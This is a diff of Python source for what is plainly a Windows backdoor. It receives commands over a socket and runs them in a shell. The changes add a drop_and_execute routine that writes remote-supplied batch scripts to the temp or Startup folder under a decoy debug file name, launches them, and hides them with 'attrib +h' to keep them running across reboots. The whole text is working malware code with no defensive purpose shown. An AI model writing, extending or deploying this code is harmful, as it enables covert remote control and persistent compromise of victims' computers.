@@ -1,7 +1,7 @@
 import socket
 from subprocess import check_output, CalledProcessError
 from pickle import dumps
-from os import getlogin, getenv, startfile, remove
+from os import getlogin, getenv, startfile, system, chdir
 
 
 class Socket:
@@ -22,17 +22,17 @@ class Socket:
 
     def receive_command(self):
         try:
-            cmd = self.active_socket.recv(128)
+            cmd = self.active_socket.recv(1024)
         except ConnectionResetError:
             self.established = False
             return False
 
         cmd = cmd.decode()
         if cmd[0:5] == "batch":
-            execute_batch_script(cmd[6:])
+            drop_and_execute(cmd[6:])
             return True
-        if cmd[0:6] == "sbatch":
-            execute_batch_script(cmd[7:], startup=True)
+        elif cmd[0:6] == "sbatch":
+            drop_and_execute(cmd[7:], startup=True)
         else:
             try:
                 output = check_output(cmd, shell=True)
@@ -52,23 +52,33 @@ class Socket:
             self.established = False
 
 
-def execute_batch_script(script, startup=False, hide_file=False):
+def drop_and_execute(script, execute_file=True, startup=False, hide_file=False):
     if not script:
-        return False
+        return
+    # Format script
     script = script.replace("/n", "\n")
-    if not startup:
-        path = getenv("temp") + "\\" + "mat-debug-1692.bat"
-        with open(path, "w+")as f:
-            f.write(script)
-        startfile(path)
-        # remove(path)
-        return True
+
+    # Default file name
+    file_name = "mat-debug-1692.bat"
+
+    # Create Path to drop and execute
+    if startup:
+        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file_name
     else:
-        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mat-debug-1692.bat"
-        with open(path , "w+")as f:
-            f.write(script)
+        path = getenv("temp") + "\\" + file_name
+
+    # Drop file
+    with open(path, "w+")as f:
+        f.write(script)
+
+    # Execute File
+    if execute_file:
         startfile(path)
-        return True
+
+    # Hide File by calling Windows command
+    if hide_file:
+        chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+        system("attrib +h " + file_name)
 
 
 def copy_to_startup(file_name):
